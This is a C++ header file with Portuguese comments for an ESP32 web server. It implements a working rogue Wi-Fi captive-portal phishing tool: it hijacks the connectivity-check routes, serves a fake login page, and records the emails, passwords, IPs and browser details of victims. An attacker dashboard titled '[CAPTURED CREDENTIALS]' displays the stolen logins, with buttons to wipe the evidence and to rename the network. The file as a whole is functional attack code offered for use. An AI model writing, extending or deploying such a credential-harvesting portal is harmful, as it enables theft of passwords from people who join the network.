#ifndef SERVER_HANDLERS_H
#define SERVER_HANDLERS_H

#include <Arduino.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include "config.h"
#include "webpages.h"
#include "utils.h"

// Handler para a página principal
void handleRoot(AsyncWebServerRequest *request)
{
    startBlueLedBlinking(); // Inicia piscada quando acessa página de login

    // Log do acesso à página
    String ip = request->client()->remoteIP().toString();
    String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "Unknown";
    logPageAccess(ip, userAgent);

    request->send(200, "text/html", loginPage);
}

// Handlers para captive portal
void handleGenerateResource(AsyncWebServerRequest *request)
{
    // Log de conexão WiFi (clique em conectar)
    String ip = request->client()->remoteIP().toString();
    logWifiConnection(ip);

    request->redirect("/");
}

void handleHotspotDetect(AsyncWebServerRequest *request)
{
    // Log de conexão WiFi (clique em conectar)
    String ip = request->client()->remoteIP().toString();
    logWifiConnection(ip);

    request->redirect("/");
}

// Handler para processar login
void handleLogin(AsyncWebServerRequest *request)
{
    String email = request->getParam("email", true)->value();
    String pass = request->getParam("pass", true)->value();

    String maskedemail = mask(email);
    String maskedPass = mask(pass);

    // Log do login
    String ip = request->client()->remoteIP().toString();
    String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "Unknown";
    logLoginAttempt(ip, userAgent, maskedemail);

    Serial.printf("Login recebido:\n  Usuário: %s\n  Senha: %s\n", maskedemail.c_str(), maskedPass.c_str());

    saveLogin(maskedemail, maskedPass);
    signalLoginReceived(); // Isso já para a piscada temporariamente e faz o efeito

    // Envia página de sucesso e registra atividade
    request->send(200, "text/html", successPage);
}

// Handler para exibir dashboard
void handleData(AsyncWebServerRequest *request)
{
    String response = R"rawliteral(<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: #000000; 
            color: #00ff00; 
            line-height: 1.4; 
            background-image: 
                radial-gradient(circle at 25% 25%, #003300 1px, transparent 1px),
                radial-gradient(circle at 75% 75%, #001100 1px, transparent 1px);
            background-size: 50px 50px;
            animation: matrix-bg 20s linear infinite;
        }
        @keyframes matrix-bg {
            0% { background-position: 0% 0%; }
            100% { background-position: 50px 50px; }
        }
        .container { max-width: 100%; margin: 0; padding: 15px; }
        .header { 
            background: linear-gradient(135deg, #001a00 0%, #003300 50%, #000000 100%); 
            color: #00ff00; 
            padding: 25px; 
            border: 2px solid #00ff00; 
            border-radius: 8px; 
            margin-bottom: 25px; 
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            position: relative;
            overflow: hidden;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
            animation: scan 3s linear infinite;
        }
        @keyframes scan {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        .header h1 { 
            font-size: 2.2rem; 
            margin: 0; 
            text-shadow: 0 0 10px #00ff00;
            font-weight: 700;
            letter-spacing: 2px;
            z-index: 1;
        }
        .header .datetime { 
            font-size: 1rem; 
            opacity: 0.8; 
            font-weight: 300;
            letter-spacing: 1px;
            z-index: 1;
            text-align: right;
            line-height: 1.3;
        }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 30px; }
        .stat-card { 
            background: #001100; 
            border: 1px solid #00ff00; 
            border-radius: 6px; 
            padding: 15px; 
            text-align: center; 
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
            transition: all 0.3s ease;
        }
        .stat-card:hover {
            box-shadow: 0 0 25px rgba(0, 255, 0, 0.4);
            transform: translateY(-2px);
        }
        .stat-number { 
            font-size: 1.8rem; 
            font-weight: 700; 
            color: #00ff00; 
            margin-bottom: 3px; 
            text-shadow: 0 0 8px #00ff00;
            font-family: 'Courier New', monospace;
        }
        .stat-label { 
            color: #00aa00; 
            font-size: 0.75rem; 
            text-transform: uppercase; 
            letter-spacing: 0.5px; 
            font-weight: 400;
        }
        .section { 
            background: #001100; 
            border: 1px solid #00ff00; 
            border-radius: 6px; 
            margin-bottom: 25px; 
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2); 
            overflow: hidden; 
        }
        .section-header { 
            background: #002200; 
            padding: 15px 20px; 
            border-bottom: 1px solid #00ff00; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            flex-wrap: wrap; 
        }
        .section-title { 
            font-size: 1.3rem; 
            color: #00ff00; 
            margin: 0; 
            font-weight: 600;
            text-shadow: 0 0 5px #00ff00;
            letter-spacing: 1px;
        }
        .controls { display: flex; gap: 8px; flex-wrap: wrap; }
        .btn { 
            padding: 8px 16px; 
            border: 1px solid #00ff00; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 0.8rem; 
            transition: all 0.3s; 
            background: #001100;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-weight: 500;
        }
        .btn-primary { background: #003300; border-color: #00ff00; }
        .btn-primary:hover { background: #004400; box-shadow: 0 0 10px rgba(0, 255, 0, 0.3); }
        .btn-danger { background: #330000; border-color: #ff0000; color: #ff0000; }
        .btn-danger:hover { background: #440000; box-shadow: 0 0 10px rgba(255, 0, 0, 0.3); }
        .table-container { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; table-layout: fixed; }
        th, td { 
            padding: 12px 10px; 
            text-align: left; 
            border-bottom: 1px solid #003300; 
            vertical-align: top; 
            font-size: 0.85rem;
            text-align: center;
        }
        th { 
            background: #002200; 
            font-weight: 600; 
            color: #00ff00; 
            position: sticky; 
            top: 0; 
            white-space: nowrap; 
            text-shadow: 0 0 3px #00ff00;
            letter-spacing: 0.5px;
        }
        .device-row { text-align: left; }
        td { white-space: normal; word-wrap: break-word; overflow-wrap: break-word; }
        tr:hover { background: #002200; }
        .device-info { 
            font-size: 0.75rem; 
            color: #00aa00; 
            white-space: normal; 
            word-wrap: break-word; 
            overflow-wrap: break-word; 
            line-height: 1.3;
            max-width: 100%;
            text-align: center;
        }
        .device-col { width: 40%; min-width: 350px; text-align: center; }
        .datetime-col { width: 18%; min-width: 140px; text-align: center; }
        .type-col { width: 15%; min-width: 120px; text-align: center; }
        .ip-col { width: 17%; min-width: 120px; text-align: center; }
        .count-col { width: 10%; min-width: 80px; text-align: center; }
        .ip-badge { 
            background: #003300; 
            color: #00ff00; 
            padding: 3px 6px; 
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 110px;
            height: 22px;
            border-radius: 3px; 
            font-family: 'Courier New', monospace; 
            border: 1px solid #00ff00;
            font-size: 0.8rem;
        }
        .type-badge { 
            padding: 3px 6px; 
            display: inline-flex;
            width: 110px;
            height: 22px;
            align-items: center;
            justify-content: center;
            border-radius: 3px; 
            font-size: 0.75rem; 
            font-weight: 600; 
            white-space: nowrap; 
            border: 1px solid;
        }
        .type-access { background: #001a00; color: #00ff00; border-color: #00ff00; }
        .type-wifi { background: #1a1600; color: #ffff00; border-color: #ffff00; }
        .type-login { background: #1a0010; color: #ff00ff; border-color: #ff00ff; }
        .access-count { 
            background: #003300; 
            color: #00ff00; 
            padding: 3px 6px; 
            border-radius: 3px; 
            font-weight: 600; 
            text-align: center; 
            min-width: 35px; 
            border: 1px solid #00ff00;
            font-family: 'Courier New', monospace;
        }
        .empty-state { 
            text-align: center; 
            padding: 30px; 
            color: #00aa00; 
            font-style: italic;
            background: #001a00;
            border: 1px dashed #00ff00;
            margin: 10px;
            border-radius: 4px;
        }
        .danger-zone { 
            margin-top: 25px; 
            padding: 20px; 
            background: #1a0000; 
            border: 2px solid #ff0000; 
            border-radius: 6px; 
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
        }
        .danger-zone h3 { 
            color: #ff0000; 
            margin-bottom: 12px; 
            text-shadow: 0 0 5px #ff0000;
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
        }
        .danger-zone p {
            color: #ff6666;
            margin-bottom: 15px;
            font-size: 0.9rem;
        }
        @media (max-width: 768px) {
            .container { padding: 10px; }
            .header { flex-direction: column; text-align: center; gap: 10px; }
            .header h1 { font-size: 1.8rem; }
            .header .datetime { 
                font-size: 0.8rem; 
                text-align: center;
                line-height: 1.2;
            }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .section-header { flex-direction: column; align-items: stretch; gap: 15px; }
            .controls { justify-content: center; }
            th, td { padding: 8px 6px; font-size: 0.8rem; }
            .stat-number { font-size: 1.5rem; }
            .device-info { font-size: 0.7rem; }
            .device-col { min-width: 300px; }
            .datetime-col { min-width: 100px; }
            .type-col { min-width: 90px; }
            .ip-col { min-width: 90px; }
            .count-col { min-width: 50px; }
            /* Ocultar seções no mobile */
            .mobile-hidden {
                display: none !important;
            }
        }
        @media (max-width: 480px) {
            .stats-grid { grid-template-columns: 1fr; }
            th, td { padding: 6px 4px; font-size: 0.75rem; }
            .btn { padding: 8px 15px; font-size: 0.8rem; }
            .device-info { 
                font-size: 0.65rem; 
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }
            .device-col { min-width: 250px; text-align: left; }
            .datetime-col { min-width: 80px; text-align: center; }
            .type-col { min-width: 70px; text-align: center; }
            .ip-col { min-width: 80px; text-align: center; }
            .count-col { min-width: 50px; text-align: center; }
            table { font-size: 0.7rem; }
        }
    </style>
</head>
<body>    <div class="container">
        <div class="header">
            <h1>DASHBOARD</h1>
            <div class="datetime">
                <div id="currentDateTime">)rawliteral" +
                      getTimestamp() + R"rawliteral(</div>
                <div id="espUptime">Uptime: )rawliteral" +
                      getUptime() + R"rawliteral(</div>
            </div>
        </div>
        
        <div class="stats-grid">)rawliteral";

    // Calcular estatísticas melhoradas
    int pageAccesses = 0, wifiConnections = 0, loginAttempts = 0;
    int totalAccesses = 0; // Total de todos os acessos
    int uniqueIPs = 0;     // IPs únicos
    String ipList = "";
    String knownDevices = ""; // Lista de IPs com dispositivos conhecidos

    File accessFile = SPIFFS.open("/access_logs.txt");
    if (accessFile)
    {
        while (accessFile.available())
        {
            String line = accessFile.readStringUntil('\n');
            if (line.indexOf("PAGE_ACCESS") >= 0)
            {
                pageAccesses++;
                totalAccesses++; // Conta TODOS os acessos

                // Extrair IP para contagem única
                int ipStart = line.indexOf("IP: ");
                if (ipStart >= 0)
                {
                    int ipEnd = line.indexOf(' ', ipStart + 4);
                    if (ipEnd == -1)
                        ipEnd = line.indexOf('|', ipStart + 4);
                    if (ipEnd == -1)
                        ipEnd = line.length();
                    String ip = line.substring(ipStart + 4, ipEnd);

                    // Verificar se tem informações de dispositivo válidas
                    int uaStart = line.indexOf("UserAgent: ");
                    bool hasValidDevice = false;
                    if (uaStart >= 0)
                    {
                        String userAgent = line.substring(uaStart + 11);
                        hasValidDevice = (userAgent != "Unknown" && userAgent.length() > 10 &&
                                          (userAgent.indexOf("Chrome") >= 0 || userAgent.indexOf("Firefox") >= 0 ||
                                           userAgent.indexOf("Safari") >= 0 || userAgent.indexOf("Edge") >= 0));
                    }

                    // Contar IPs únicos
                    if (ipList.indexOf(ip) == -1)
                    {
                        if (ipList.length() > 0)
                            ipList += ",";
                        ipList += ip;
                        uniqueIPs++;
                    }

                    // Contar apenas IPs com dispositivos conhecidos
                    if (hasValidDevice && knownDevices.indexOf(ip) == -1)
                    {
                        if (knownDevices.length() > 0)
                            knownDevices += ",";
                        knownDevices += ip;
                    }
                }
            }
            else if (line.indexOf("WIFI_CONNECT") >= 0)
            {
                wifiConnections++;
            }
            else if (line.indexOf("LOGIN_SUCCESS") >= 0)
            {
                loginAttempts++;
            }
        }
        accessFile.close();
    }

    response += "<div class=\"stat-card\"><div class=\"stat-number\">" + String(totalAccesses) + "</div><div class=\"stat-label\">PAGE ACCESS</div></div>";
    response += "<div class=\"stat-card\"><div class=\"stat-number\">" + String(uniqueIPs) + "</div><div class=\"stat-label\">UNIQUE IPS</div></div>";
    response += "<div class=\"stat-card\"><div class=\"stat-number\">" + String(wifiConnections) + "</div><div class=\"stat-label\">WIFI CONNECT</div></div>";
    response += "<div class=\"stat-card\"><div class=\"stat-number\">" + String(loginAttempts) + "</div><div class=\"stat-label\">LOGIN SUCCESS</div></div>";

    response += R"rawliteral(
        </div>
        
        <div class="section">
            <div class="section-header">
                <h2 class="section-title">[CONFIGURATION]</h2>
            </div>
            <div style="padding: 20px;">
                <div id="status-message" style="display: none; background: #002200; border: 1px solid #00ff00; border-radius: 4px; padding: 15px; margin-bottom: 20px; color: #00ff00; text-align: center; font-weight: bold;">
                    <span id="status-text"></span>
                </div>
                <form id="ssid-form" method="POST" action="/update_ssid" style="margin-bottom: 20px;">
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; color: #00ff00; font-weight: 600;">CURRENT SSID:</label>
                        <div style="background: #002200; padding: 10px; border: 1px solid #00ff00; border-radius: 4px; color: #00ff00; font-family: 'Courier New', monospace;">)rawliteral" +
                String(ssid) + R"rawliteral(</div>
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; color: #00ff00; font-weight: 600;">NEW SSID:</label>
                        <input type="text" id="new-ssid-input" name="new_ssid" maxlength="32" required 
                               style="width: 100%; padding: 10px; background: #001100; border: 1px solid #00ff00; border-radius: 4px; color: #00ff00; font-family: 'Courier New', monospace; box-sizing: border-box;"
                               placeholder="Enter new WiFi network name...">
                    </div>
                    <button type="submit" class="btn btn-primary">[UPDATE SSID]</button>
                </form>
                <div style="background: #1a1600; border: 1px solid #ffff00; border-radius: 4px; padding: 15px; margin-top: 15px;">
                    <strong style="color: #ffff00;">⚠️ WARNING:</strong>
                    <p style="margin: 5px 0 0 0; color: #cccc00; font-size: 0.9rem;">
                        Changing the SSID will restart the ESP32 and you'll need to reconnect to the new network name.
                    </p>
                </div>
                <script>
                document.getElementById('ssid-form').addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const newSSID = document.getElementById('new-ssid-input').value.trim();
                    if (!newSSID) {
                        showStatus('Please enter a valid SSID', '#ff0000');
                        return;
                    }
                    
                    if (!confirm('Change SSID to "' + newSSID + '"? This will restart the ESP32!')) {
                        return;
                    }
                    
                    showStatus('Updating SSID and restarting ESP32...', '#ffff00');
                    
                    const formData = new FormData();
                    formData.append('new_ssid', newSSID);
                    
                    fetch('/update_ssid', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.text())
                    .then(data => {
                        showStatus('SSID updated! ESP32 restarting... Reconnect to "' + newSSID + '"', '#00ff00');
                    })
                    .catch(error => {
                        showStatus('Error updating SSID: ' + error, '#ff0000');
                    });
                });
                
                function showStatus(message, color) {
                    const statusDiv = document.getElementById('status-message');
                    const statusText = document.getElementById('status-text');
                    statusText.textContent = message;
                    statusDiv.style.borderColor = color;
                    statusDiv.style.color = color;
                    statusDiv.style.display = 'block';
                }
                </script>
            </div>
        </div>
        
        <div class="section mobile-hidden">
            <div class="section-header">
                <h2 class="section-title">[ACTIVITY LOGS]</h2>
                <div class="controls">
                    <button class="btn btn-primary" onclick="location.reload()">[REFRESH]</button>
                </div>
            </div>
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th class="datetime-col">TIMESTAMP</th>
                            <th class="type-col">EVENT</th>
                            <th class="ip-col">IP ADDRESS</th>
                            <th class="count-col">FIRST SEEN</th>
                            <th class="device-col">USER AGENT</th>
                        </tr>
                    </thead>
                    <tbody>)rawliteral";

    // Mostrar logs com informações mais limpas
    File accessFile2 = SPIFFS.open("/access_logs.txt");
    if (accessFile2)
    {
        String allLines = "";
        while (accessFile2.available())
        {
            allLines += accessFile2.readStringUntil('\n') + "\n";
        }
        accessFile2.close();

        // Contar acessos por IP
        String ipAccessCounts = "";

        // Primeiro passo: contar acessos por IP (apenas PAGE_ACCESS, não LOGIN)
        int startIdx = 0;
        while (startIdx < allLines.length())
        {
            int endIdx = allLines.indexOf('\n', startIdx);
            if (endIdx == -1)
                break;

            String line = allLines.substring(startIdx, endIdx);
            if (line.indexOf("PAGE_ACCESS") >= 0)
            {
                int ipStart = line.indexOf("IP: ");
                if (ipStart >= 0)
                {
                    int ipEnd = line.indexOf(' ', ipStart + 4);
                    if (ipEnd == -1)
                        ipEnd = line.indexOf('|', ipStart + 4);
                    if (ipEnd == -1)
                        ipEnd = line.length();
                    String ip = line.substring(ipStart + 4, ipEnd);

                    // Contar este IP
                    String searchPattern = ip + ":";
                    int existingPos = ipAccessCounts.indexOf(searchPattern);
                    if (existingPos >= 0)
                    {
                        // IP já existe, incrementar contador
                        int countStart = existingPos + searchPattern.length();
                        int countEnd = ipAccessCounts.indexOf(';', countStart);
                        if (countEnd == -1)
                            countEnd = ipAccessCounts.length();
                        int currentCount = ipAccessCounts.substring(countStart, countEnd).toInt();
                        String newCount = String(currentCount + 1);
                        ipAccessCounts = ipAccessCounts.substring(0, countStart) + newCount + ipAccessCounts.substring(countEnd);
                    }
                    else
                    {
                        // Novo IP
                        if (ipAccessCounts.length() > 0)
                            ipAccessCounts += ";";
                        ipAccessCounts += ip + ":1";
                    }
                }
            }
            startIdx = endIdx + 1;
        }

        // Pegar últimas 100 linhas para mais contexto
        int lineCount = 0;
        int pos = allLines.length();
        while (pos > 0 && lineCount < 100)
        {
            pos = allLines.lastIndexOf('\n', pos - 1);
            if (pos >= 0)
                lineCount++;
        }

        String recentLines = allLines.substring(pos + 1);
        String seenDevices = ""; // Para rastrear combinações IP+Device já exibidas

        startIdx = 0;
        while (startIdx < recentLines.length())
        {
            int endIdx = recentLines.indexOf('\n', startIdx);
            if (endIdx == -1)
                break;

            String line = recentLines.substring(startIdx, endIdx);
            line.trim();

            if (line.length() > 0)
            {
                int timeEnd = line.indexOf(']');
                int typeStart = timeEnd + 2;
                int typeEnd = line.indexOf(" |");

                if (timeEnd > 0 && typeEnd > typeStart)
                {
                    String timeStr = line.substring(1, timeEnd);
                    String type = line.substring(typeStart, typeEnd);
                    String details = line.substring(typeEnd + 3);

                    String ip = "N/A";
                    String deviceInfo = "";

                    // Extrair IP
                    int ipStart = details.indexOf("IP: ");
                    if (ipStart >= 0)
                    {
                        int ipEnd = details.indexOf(' ', ipStart + 4);
                        if (ipEnd == -1)
                            ipEnd = details.indexOf('|', ipStart + 4);
                        if (ipEnd == -1)
                            ipEnd = details.length();
                        ip = details.substring(ipStart + 4, ipEnd);
                    }

                    // Obter contagem de acessos para este IP
                    String accessCount = "0";
                    String searchPattern = ip + ":";
                    int countPos = ipAccessCounts.indexOf(searchPattern);
                    if (countPos >= 0)
                    {
                        int countStart = countPos + searchPattern.length();
                        int countEnd = ipAccessCounts.indexOf(';', countStart);
                        if (countEnd == -1)
                            countEnd = ipAccessCounts.length();
                        accessCount = ipAccessCounts.substring(countStart, countEnd);
                    }

                    // Extrair User Agent completo
                    int uaStart = details.indexOf("UserAgent: ");
                    if (uaStart >= 0)
                    {
                        String userAgent = details.substring(uaStart + 11);
                        // Exibir o User Agent completo sem modificações
                        deviceInfo = userAgent;
                    }
                    else
                    {
                        deviceInfo = "";
                    }

                    // Filtrar dispositivos "Unknown" ou vazios
                    String deviceKey = ip + "|" + deviceInfo;
                    bool shouldShow = true;

                    // Não exibir dispositivos desconhecidos ou vazios
                    if (deviceInfo.length() == 0 || deviceInfo == "Unknown" ||
                        deviceInfo.indexOf("Unknown") >= 0 || deviceInfo.length() < 10)
                    {
                        shouldShow = false;
                    }

                    // Evitar duplicatas da mesma combinação IP+Device
                    if (shouldShow && seenDevices.indexOf(deviceKey) >= 0)
                    {
                        shouldShow = false;
                    }

                    if (shouldShow)
                    {
                        seenDevices += deviceKey + ";";

                        // Adicionar email para logins
                        if (type == "LOGIN_SUCCESS")
                        {
                            int emailStart = details.indexOf("Email: ");
                            if (emailStart >= 0)
                            {
                                int emailEnd = details.indexOf(' ', emailStart + 7);
                                if (emailEnd == -1)
                                    emailEnd = details.indexOf('|', emailStart + 7);
                                String email = details.substring(emailStart + 7, emailEnd);
                                deviceInfo = "Login: " + email + "<br><span class=\"device-info\">" + deviceInfo + "</span>";
                            }
                        }
                        else
                        {
                            // Para dispositivos normais, exibir o User Agent completo sem formatação especial
                            deviceInfo = "<span class=\"device-info\">" + deviceInfo + "</span>";
                        }

                        String typeLabel = type;
                        String typeBadgeClass = "";
                        if (type == "PAGE_ACCESS")
                        {
                            typeLabel = "[PAGE_ACCESS]";
                            typeBadgeClass = "type-access";
                        }
                        else if (type == "WIFI_CONNECT")
                        {
                            typeLabel = "[WIFI_CONNECT]";
                            typeBadgeClass = "type-wifi";
                        }
                        else if (type == "LOGIN_SUCCESS")
                        {
                            typeLabel = "[LOGIN_SUCCESS]";
                            typeBadgeClass = "type-login";
                        }

                        response += "<tr><td>" + timeStr + "</td><td><span class=\"type-badge " + typeBadgeClass + "\">" + typeLabel + "</span></td><td><span class=\"ip-badge\">" + ip + "</span></td><td><span class=\"access-count\">" + accessCount + "</span></td><td class=\"device-row\">" + deviceInfo + "</td></tr>";
                    }
                }
            }
            startIdx = endIdx + 1;
        }
    }
    else
    {
        response += "<tr><td colspan=\"5\" class=\"empty-state\">[NO ACTIVITY DETECTED]</td></tr>";
    }

    response += R"rawliteral(
                    </tbody>
                </table>
            </div>
        </div>
        
        <div class="section mobile-hidden">
            <div class="section-header">
                <h2 class="section-title">[CAPTURED CREDENTIALS]</h2>
            </div>
            <div class="table-container">
                <table>
                    <thead>
                        <tr><th>LOGIN</th><th>PASSWORD</th></tr>
                    </thead>
                    <tbody>)rawliteral";

    // Mostrar credenciais
    File file = SPIFFS.open("/data.txt");
    if (file && file.size() > 0)
    {
        while (file.available())
        {
            String line = file.readStringUntil('\n');
            line.trim();
            if (line.length() > 0)
            {
                int emailIndex = line.indexOf("Email: ");
                int passIndex = line.indexOf(" | Senha: ");
                if (emailIndex >= 0 && passIndex > emailIndex)
                {
                    String email = line.substring(emailIndex + 7, passIndex);
                    email.trim();
                    String pass = line.substring(passIndex + 10);
                    pass.trim();
                    response += "<tr><td>" + email + "</td><td>" + pass + "</td></tr>";
                }
            }
        }
        file.close();
    }
    else
    {
        response += "<tr><td colspan=\"2\" class=\"empty-state\">[NO TARGETS BREACHED]</td></tr>";
    }

    response += R"rawliteral(
                    </tbody>
                </table>
            </div>
        </div>

        <div class="danger-zone mobile-hidden">
            <h3>[DANGER ZONE]</h3>
            <p>>>> IRREVERSIBLE OPERATIONS - PROCEED WITH CAUTION <<<</p>
            <div class="controls" style="margin-top: 15px;">
                <form method="POST" action="/clear_logs" style="display:inline;">
                    <button type="submit" class="btn btn-danger" onclick="return confirm('[CONFIRM] Wipe all activity logs? This action cannot be undone!')">[WIPE LOGS]</button>
                </form>
                <form method="POST" action="/erase" style="display:inline;">
                    <button type="submit" class="btn btn-danger" onclick="return confirm('[CONFIRM] Delete all captured credentials? This action cannot be undone!')">[DELETE CREDS]</button>
                </form>
            </div>
        </div>
    </div>
    
    <script>
        // Usar hora real do navegador e uptime do ESP32
        function updateRealTime() {
            const now = new Date();
            const day = String(now.getDate()).padStart(2, '0');
            const month = String(now.getMonth() + 1).padStart(2, '0');
            const year = now.getFullYear();
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const seconds = String(now.getSeconds()).padStart(2, '0');
            
            const dateTimeString = `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;
            document.getElementById('currentDateTime').textContent = dateTimeString;
        }
        
        // Função para atualizar uptime do ESP32
        function updateEspUptime() {
            fetch('/api/uptime')
                .then(response => response.text())
                .then(uptime => {
                    const uptimeElement = document.getElementById('espUptime');
                    if (uptimeElement) {
                        uptimeElement.textContent = `Up time: ${uptime}`;
                    }
                })
                .catch(() => {});
        }
        
        // Atualizar hora real a cada segundo
        updateRealTime();
        setInterval(updateRealTime, 1000);
        
        // Atualizar uptime do ESP32 a cada segundo também
        updateEspUptime();
        setInterval(updateEspUptime, 1000);
    </script>
</body>
</html>)rawliteral";

    request->send(200, "text/html", response);
}

// Handler para apagar dados
void handleErase(AsyncWebServerRequest *request)
{
    if (SPIFFS.exists("/data.txt"))
    {
        SPIFFS.remove("/data.txt");
    }
    request->redirect("/data");
}

// Handler para limpar logs de atividade
void handleClearLogs(AsyncWebServerRequest *request)
{
    if (SPIFFS.exists("/access_logs.txt"))
    {
        SPIFFS.remove("/access_logs.txt");
    }
    request->redirect("/data");
}

// Handler para atualizar SSID
void handleUpdateSSID(AsyncWebServerRequest *request)
{
    if (request->hasParam("new_ssid", true))
    {
        String newSSID = request->getParam("new_ssid", true)->value();
        newSSID.trim();

        // Validar SSID
        if (newSSID.length() > 0 && newSSID.length() <= 32)
        {
            // Salvar novo SSID no SPIFFS
            if (saveSSIDToConfig(newSSID))
            {
                // Log da mudança
                String ip = request->client()->remoteIP().toString();
                String userAgent = request->hasHeader("User-Agent") ? request->header("User-Agent") : "Unknown";
                File logFile = SPIFFS.open("/access_logs.txt", "a");
                if (logFile)
                {
                    logFile.printf("[%s] CONFIG_CHANGE | IP: %s | SSID changed to: %s | UserAgent: %s\n",
                                   getTimestamp().c_str(), ip.c_str(), newSSID.c_str(), userAgent.c_str());
                    logFile.close();
                }

                // Resposta rápida de sucesso
                request->send(200, "text/plain", "SSID updated successfully. ESP32 restarting...");

                // Pequeno delay para garantir que a resposta seja enviada
                delay(500);

                // Reiniciar ESP32 imediatamente
                ESP.restart();
            }
            else
            {
                request->send(500, "text/plain", "Error saving configuration");
            }
        }
        else
        {
            request->send(400, "text/plain", "Invalid SSID (must be 1-32 characters)");
        }
    }
    else
    {
        request->send(400, "text/plain", "Missing SSID parameter");
    }
}

// Handler para recursos estáticos (não inicia piscada)
void handleStaticResource(AsyncWebServerRequest *request)
{
    // Recursos estáticos não devem iniciar piscada, apenas responder
    request->send(404, "text/plain", "Not Found");
}

// Função para verificar se é uma requisição de recurso estático
bool isStaticResource(String path)
{
    return path.endsWith(".css") || path.endsWith(".js") ||
           path.endsWith(".png") || path.endsWith(".jpg") ||
           path.endsWith(".ico") || path.endsWith(".gif") ||
           path.endsWith(".svg") || path.endsWith(".woff") ||
           path.endsWith(".ttf");
}

// Handler melhorado para páginas não encontradas
void handleNotFound(AsyncWebServerRequest *request)
{
    String path = request->url();

    // Se for recurso estático, não inicia piscada
    if (isStaticResource(path))
    {
        handleStaticResource(request);
        return;
    }

    // Se for página real, redireciona para login (que já inicia piscada)
    request->redirect("/");
}

// Handler para keepalive do JS
void handleKeepAlive(AsyncWebServerRequest *request)
{
    keepAliveBlink();
    request->send(200, "text/plain", "OK");
}

// Handler para retornar uptime do ESP32
void handleUptime(AsyncWebServerRequest *request)
{
    request->send(200, "text/plain", getUptime());
}

// Função para configurar todas as rotas do servidor
void setupServerRoutes(AsyncWebServer &server)
{
    // Serve a página de login
    server.on("/", HTTP_GET, handleRoot);

    // Captive portal routes
    server.on("/generate_204", HTTP_GET, handleGenerateResource);
    server.on("/hotspot-detect.html", HTTP_GET, handleHotspotDetect);
    server.onNotFound(handleNotFound);

    // Processa o login postado
    server.on("/login", HTTP_POST, handleLogin);

    // Exibe os dados salvos
    server.on("/data", HTTP_GET, handleData);

    // Apaga o arquivo de dados
    server.on("/erase", HTTP_POST, handleErase);

    // Limpa os logs de atividade
    server.on("/clear_logs", HTTP_POST, handleClearLogs);

    // Atualiza o SSID
    server.on("/update_ssid", HTTP_POST, handleUpdateSSID);

    // Keepalive para manter LED piscando
    server.on("/keepalive", HTTP_GET, handleKeepAlive);

    // Endpoint para obter uptime do ESP32
    server.on("/api/uptime", HTTP_GET, handleUptime);

    // Rota para atualizar SSID
    server.on("/update_ssid", HTTP_POST, handleUpdateSSID);
}

#endif
